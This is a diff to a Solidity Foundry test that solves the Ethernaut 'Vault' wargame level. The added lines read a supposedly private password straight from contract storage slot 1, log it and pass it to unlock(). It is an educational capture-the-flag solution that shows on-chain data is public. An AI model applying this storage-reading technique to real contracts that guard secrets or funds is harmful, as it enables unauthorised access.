@@ -37,6 +37,16 @@ contract VaultTest is DSTest {
         //////////////////
  
 
+        // load contract storage at specific slot
+        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
+        // Log bytes stored at that memory location
+        emit log_bytes(abi.encodePacked(password)); 
+
+        // The following lines just convert from bytes32 to a string and logs it so you can see that the password we have obtained is correct
+        emit log_string(string(abi.encodePacked(password)));
+
+        // Call the unlock function with the password we read from storage
+        ethernautVault.unlock(password);
 
         //////////////////////
         // LEVEL SUBMISSION //
@@ -44,6 +54,6 @@ contract VaultTest is DSTest {
 
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
-        // assert(levelSuccessfullyPassed);
+        assert(levelSuccessfullyPassed);
     }
 }
